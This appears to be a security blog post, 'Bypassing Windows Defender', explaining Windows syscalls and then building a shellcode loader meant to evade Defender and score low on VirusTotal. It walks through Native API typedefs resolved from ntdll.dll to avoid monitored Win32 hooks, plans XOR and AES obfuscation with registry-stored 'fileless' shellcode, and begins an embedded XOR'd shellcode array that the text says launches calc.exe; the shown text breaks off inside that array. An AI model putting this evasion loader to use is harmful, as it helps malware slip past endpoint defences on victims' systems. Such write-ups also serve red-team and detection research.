<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hexagram.foo/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://hexagram.foo/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hexagram.foo/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://hexagram.foo/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Bypassing Windows Defender</h1><div class=post-meta><span title='2025-04-16 00:00:00 +0000 UTC'>April 16, 2025</span>&nbsp;·&nbsp;<span>15 min</span>&nbsp;·&nbsp;<span>3123 words</span>&nbsp;·&nbsp;<span>Stephan Bridger</span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#syscalls aria-label=&ldquo;Syscalls&rdquo;>&ldquo;Syscalls&rdquo;</a></li><li><a href=#typedefs-for-you-and-me aria-label="TypeDefs, For You and Me">TypeDefs, For You and Me</a></li><li><a href=#foo aria-label=foo()>foo()</a></li><li><a href=#profit aria-label=Profit?>Profit?</a></li></ul></div></details></div><div class=post-content><p>Lately I&rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I&rsquo;d try to bypass Windows Defender <em>and</em> get a low score on Virus Total.</p><p>One trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.</p><h2 id=syscalls>&ldquo;Syscalls&rdquo;<a hidden class=anchor aria-hidden=true href=#syscalls>#</a></h2><blockquote><p>Windows gives each user-mode application a block of virtual addresses. This is known as the user space of that application. The other large block of addresses, known as system space or kernel space, cannot be directly accessed by the application.</p></blockquote><p>To request a service from the kernel (like reading a file or opening a process), a usermode program must make a system call using the <code>syscall</code> instruction. This tells the kernel which function it needs by placing a System Service Number or SSN in the <code>eax</code> register.</p><p>The SSN is basically an index in a table known as the <a href=https://en.wikipedia.org/wiki/System_Service_Descriptor_Table>system service descriptor table</a>, where each number points to a different kernel function. For example:</p><ul><li><code>eax = 0</code> -> Calls the 1st function in the table</li><li><code>eax = 1</code> -> Calls the 2nd function</li><li><code>eax = 2</code> -> Calls the 3rd, and so on.</li></ul><p>The kernel finds the function using: <code>function_address = SSDT_base + (System Service Number)</code></p><p>tl;dr when a <code>syscall</code> instruction runs, the CPU switches from usermode to kernel mode, and the system call handler uses the system service number in <code>eax</code> to execute the correct function.</p><p>Usermode functions then, in many cases, reach out to <code>ntdll.dll</code>, which in turn call into the kernel image, <code>ntoskrnl.exe</code>.</p><img class=in-text src=/modes.jpg alt=VirusTotal height=600 width=800 style=max-width:100%;height:auto><p><em>Image from <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2201301&amp;seqNum=2">Microsoft Press Store</a> by Pearson</em></p><p>For example, we can see this artifact here—if I write some code in userland that uses the following Win32 API functions, <code>CreateFileA</code> and <code>WriteFile</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>path</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>filename</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>hFile</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>bytesWritten</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter the path: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Enter the filename: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>fullPath</span><span class=p>[</span><span class=n>MAX_PATH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>snprintf</span><span class=p>(</span><span class=n>fullPath</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>fullPath</span><span class=p>),</span> <span class=s>&#34;%s</span><span class=se>\\</span><span class=s>%s&#34;</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>hFile</span> <span class=o>=</span> <span class=nf>CreateFileA</span><span class=p>(</span><span class=n>fullPath</span><span class=p>,</span> <span class=n>GENERIC_WRITE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=n>CREATE_NEW</span><span class=p>,</span> <span class=n>FILE_ATTRIBUTE_NORMAL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>hFile</span> <span class=o>==</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>DWORD</span> <span class=n>error</span> <span class=o>=</span> <span class=nf>GetLastError</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>LPVOID</span> <span class=n>errorMsg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>FormatMessageA</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>FORMAT_MESSAGE_ALLOCATE_BUFFER</span> <span class=o>|</span> <span class=n>FORMAT_MESSAGE_FROM_SYSTEM</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>error</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=n>LPSTR</span><span class=p>)</span><span class=o>&amp;</span><span class=n>errorMsg</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nb>NULL</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed to create the file: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>errorMsg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>LocalFree</span><span class=p>(</span><span class=n>errorMsg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>content</span> <span class=o>=</span> <span class=s>&#34;Noted&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>WriteFile</span><span class=p>(</span><span class=n>hFile</span><span class=p>,</span> <span class=n>content</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>content</span><span class=p>),</span> <span class=o>&amp;</span><span class=n>bytesWritten</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>))</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed to write to the file.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>CloseHandle</span><span class=p>(</span><span class=n>hFile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>CloseHandle</span><span class=p>(</span><span class=n>hFile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;File created successfully: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fullPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This code uses the userland hooks <code>CreateFileA</code> and <code>WriteFile</code>. But if we <a href=https://hexagr.blogspot.com/2023/08/windows.html>compile this code</a> and step through it in a debugger or decompiler, we&rsquo;ll see something else: under the hood, these functions invoke <code>NtCreateFile</code> and <code>NtWriteFile</code>—Native API stubs in <code>ntdll.dll</code> that set up registers and issue the actual syscall.</p><p><code>CreateFileA</code> is a high-level wrapper over the Native API. It handles things like ANSI/unicode conversion, then delegates to <code>NtCreateFile</code>, which prepares the registers and triggers the syscall within <code>ntoskrnl.exe</code>.</p><blockquote><p>Nt or Zw are system calls declared in ntdll.dll and ntoskrnl.exe. When called from ntdll.dll in user mode, these groups are almost exactly the same; they trap into kernel mode and call the equivalent function in <a href=https://en.wikipedia.org/wiki/Ntoskrnl.exe>ntoskrnl.exe</a> via the SSDT. When calling the functions directly in ntoskrnl.exe (only possible in kernel mode), the Zw variants ensure kernel mode, whereas the Nt variants do not.</p></blockquote><p>So, native calls reach out to the System Service Descriptor Table (SSDT), which holds an array of offsets to kernel system calls:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tagSERVICE_DESCRIPTOR_TABLE</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>SYSTEM_SERVICE_TABLE</span> <span class=n>nt</span><span class=p>;</span> <span class=c1>//effectively a pointer to Service Dispatch Table (SSDT) itself
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>SYSTEM_SERVICE_TABLE</span> <span class=n>win32k</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SYSTEM_SERVICE_TABLE</span> <span class=n>sst3</span><span class=p>;</span> <span class=c1>//pointer to a memory address that contains how many routines are defined in the table
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>SYSTEM_SERVICE_TABLE</span> <span class=n>sst4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>SERVICE_DESCRIPTOR_TABLE</span><span class=p>;</span>
</span></span></code></pre></div><p>So, calls to functions in <code>ntdll.dll</code> in turn get <a href=https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwwritefile>converted to low-level calls</a> like <code>ZwCreateFile</code> and <code>ZwWriteFile</code>, courtesy of the index we pass to <code>ntdll.dll</code> and the syscall.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=c1>//snipped
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>mov</span> <span class=no>r10</span><span class=p>,</span><span class=no>rcx</span>                     <span class=err>|</span> <span class=no>NtWriteFile</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=no>eax</span><span class=p>,</span><span class=mi>8</span>                       <span class=err>|</span>
</span></span><span class=line><span class=cl><span class=nf>test</span> <span class=no>byte</span> <span class=no>ptr</span> <span class=no>ds</span><span class=p>:[</span><span class=mi>7</span><span class=no>FFE0308</span><span class=p>],</span><span class=mi>1</span>   <span class=err>|</span>
</span></span><span class=line><span class=cl><span class=nf>jne</span> <span class=no>ntdll.7FFF055AEE55</span>          <span class=err>|</span>
</span></span><span class=line><span class=cl><span class=nf>syscall</span>                         <span class=err>|</span>
</span></span><span class=line><span class=cl><span class=nf>ret</span>                   
</span></span></code></pre></div><p>In this blog post, we&rsquo;ll use indirect syscalls which leverage native functions within <code>ntdll.dll</code>, avoiding certain calls to the Win32 API.</p><p>Since <code>ntdll.dll</code> is available to every Windows process and provides the interface for user-mode programs to interact with kernel services, using system calls through ntdll.dll can help activity appear more legitimate.</p><p>If we bypassed ntdll.dll and directly called kernel functions, it could stick out, increasing the likelihood of being detected by security tools that monitor abnormal behavior.</p><p>In a future blog post, we&rsquo;ll cover additional changes to our setup, including alternative approaches to enhancing stealth, such as unhooking.</p><h2 id=typedefs-for-you-and-me>TypeDefs, For You and Me<a hidden class=anchor aria-hidden=true href=#typedefs-for-you-and-me>#</a></h2><p>By default, Windows Defender and various telemetry heavily monitor most of the things that happen in userland. This is to say that using userland hooks to do anything interesting can make it stick out—in a bad way.</p><p>To improve our chances of flying under the radar, we can use some alternative userland functions and instead make calls using Native API functionality within <code>ntdll.dll</code>, which in turn make syscalls to the kernel.</p><p>But to do this, we&rsquo;ll need some initial declarations. These are the type definitions we&rsquo;ll use for Native API functions. We start with the <code>_PS_ATTRIBUTE</code> for process and thread creation<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>, along with unicode handling, process attributes, and identification for processes and threads.</p><p>We also define the types we’ll need for indirect calls to allocate memory<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> and spin up new process threads<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>, which we&rsquo;ll do using pNtAllocateVirtualMemory, pNtCreateThreadEx, and pNtWaitForSingleObject, respectively.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;Lmcons.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;bcrypt.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;bcrypt.lib&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_PS_ATTRIBUTE</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>Attribute</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>Size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>union</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ULONG</span> <span class=n>Value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>PVOID</span> <span class=n>ValuePtr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>u1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PSIZE_T</span> <span class=n>ReturnLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>PS_ATTRIBUTE</span><span class=p>,</span> <span class=o>*</span> <span class=n>PPS_ATTRIBUTE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_PS_ATTRIBUTE_LIST</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>TotalLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PS_ATTRIBUTE</span> <span class=n>Attributes</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>PS_ATTRIBUTE_LIST</span><span class=p>,</span> <span class=o>*</span> <span class=n>PPS_ATTRIBUTE_LIST</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_UNICODE_STRING</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>USHORT</span> <span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>USHORT</span> <span class=n>MaximumLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PWSTR</span>  <span class=n>Buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>UNICODE_STRING</span><span class=p>,</span> <span class=o>*</span> <span class=n>PUNICODE_STRING</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_OBJECT_ATTRIBUTES</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span>           <span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span>          <span class=n>RootDirectory</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PUNICODE_STRING</span> <span class=n>ObjectName</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span>           <span class=n>Attributes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>           <span class=n>SecurityDescriptor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span>           <span class=n>SecurityQualityOfService</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>OBJECT_ATTRIBUTES</span><span class=p>,</span> <span class=o>*</span> <span class=n>POBJECT_ATTRIBUTES</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>_CLIENT_ID</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>UniqueProcess</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>UniqueThread</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>CLIENT_ID</span><span class=p>,</span> <span class=o>*</span> <span class=n>PCLIENT_ID</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Define prototypes with proper calling convention
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtAllocateVirtualMemory</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span><span class=o>*</span> <span class=n>BaseAddress</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG_PTR</span> <span class=n>ZeroBits</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PSIZE_T</span> <span class=n>RegionSize</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>AllocationType</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>Protect</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtProtectVirtualMemory</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span><span class=o>*</span> <span class=n>BaseAddress</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PSIZE_T</span> <span class=n>NumberOfBytesToProtect</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>NewAccessProtection</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PULONG</span> <span class=n>OldAccessProtection</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtCreateThreadEx</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>PHANDLE</span> <span class=n>ThreadHandle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ACCESS_MASK</span> <span class=n>DesiredAccess</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>POBJECT_ATTRIBUTES</span> <span class=n>ObjectAttributes</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>StartRoutine</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span> <span class=n>Argument</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>CreateFlags</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>ZeroBits</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>StackSize</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>SIZE_T</span> <span class=n>MaximumStackSize</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PPS_ATTRIBUTE_LIST</span> <span class=n>AttributeList</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtWaitForSingleObject</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>Handle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>BOOLEAN</span> <span class=n>Alertable</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PLARGE_INTEGER</span> <span class=n>Timeout</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtFreeVirtualMemory</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>ProcessHandle</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PVOID</span><span class=o>*</span> <span class=n>BaseAddress</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>PSIZE_T</span> <span class=n>RegionSize</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>ULONG</span> <span class=n>FreeType</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=nf>NTSTATUS</span><span class=p>(</span><span class=n>NTAPI</span><span class=o>*</span> <span class=n>pNtClose</span><span class=p>)(</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>Handle</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Function to get NTDLL function address
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>PVOID</span> <span class=nf>GetNtdllFunction</span><span class=p>(</span><span class=n>LPCSTR</span> <span class=n>FunctionName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>HMODULE</span> <span class=n>hNtdll</span> <span class=o>=</span> <span class=nf>GetModuleHandleA</span><span class=p>(</span><span class=s>&#34;ntdll.dll&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>hNtdll</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>GetProcAddress</span><span class=p>(</span><span class=n>hNtdll</span><span class=p>,</span> <span class=n>FunctionName</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>To reiterate the point here: all of this is to avoid calling userland hooks that are more heavily monitored by telemetry products like Windows Defender. For example, the userland function <code>CreateRemoteThread</code> might stick out. That is, instead of calling the userland hook, we call <code>pNtCreateThreadEx</code>.</p><h2 id=foo>foo()<a hidden class=anchor aria-hidden=true href=#foo>#</a></h2><p>Now that we have type definitions to use with some of our <code>ntdll.dll</code> calls later on, next we need shellcode and functions for encryption and execution. The shellcode is just a simple payload that launches <code>calc.exe</code>.</p><p>Side note: I’ve already XOR’d the payload before embedding it in the program. We’ll reverse the XOR just before execution.</p><p>So, beyond our shellcode, we&rsquo;ll use the following constructions: an AES encryption routine, an AES decryption routine, a reverse XOR routine, functions to read from and write to the Windows registry, and indirect system calls for allocating read-write-execute memory and spinning up new process threads.</p><p>But first, our AES routines. We generate our encryption key using the username of the current user. If the username is less than 16 characters, we just pad it with <code>0x01</code>. We then follow the conventions for using the BCrypt API from Microsoft<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>const</span> <span class=n>BYTE</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xb7</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc8</span><span class=p>,</span> <span class=mh>0xaf</span><span class=p>,</span> <span class=mh>0xbb</span><span class=p>,</span> <span class=mh>0xa3</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x4b</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x1b</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x1d</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>    <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0xc0</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x1b</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0xfc</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x8b</span><span class=p>,</span> 
